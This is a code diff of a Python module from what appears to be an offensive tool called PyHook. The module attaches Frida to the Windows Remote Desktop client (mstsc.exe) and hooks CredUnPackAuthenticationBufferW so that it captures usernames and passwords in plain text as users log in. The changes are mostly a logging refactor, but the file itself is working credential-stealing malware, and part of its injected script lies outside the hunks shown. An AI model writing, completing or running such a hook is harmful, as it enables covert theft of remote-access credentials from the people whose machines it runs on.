@@ -1,19 +1,26 @@
 import frida
-from PyHook import wait_for_process, on_credential_submit
+from PyHook import wait_for_process, on_credential_submit, log
+
+
+hook_process_name = "rdp"
+
+
+def logger(message):
+    log(hook_process_name, message)
 
 
 def wait_for():
-    wait_for_process(["mstsc.exe"], "RDP", hook)
+    wait_for_process(["mstsc.exe"], hook)
 
 
 def hook(pid):
     try:
-        print("[+] Trying To Attach To RDP")
+        logger("Trying To Hook Into RDP")
         session = frida.attach(pid)
-        print(f"[+] Attached To RDP with pid {pid}!")
+        logger(f"Hooked RDP With PID {pid}")
 
         # We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
-        hook = session.create_script("""
+        script = session.create_script("""
 
         var username;
         var password;
@@ -40,9 +47,9 @@ def hook(pid):
         });
 
         """)
-        hook.on('message', on_credential_submit)
-        hook.load()
+        script.on('message', on_credential_submit)
+        script.load()
 
     except Exception as e:
-        print("[-] Unhandled exception: " + str(e))
-        print("[-] Continuing...")
+        logger("Unhandled exception: " + str(e))
+        logger("Continuing...")
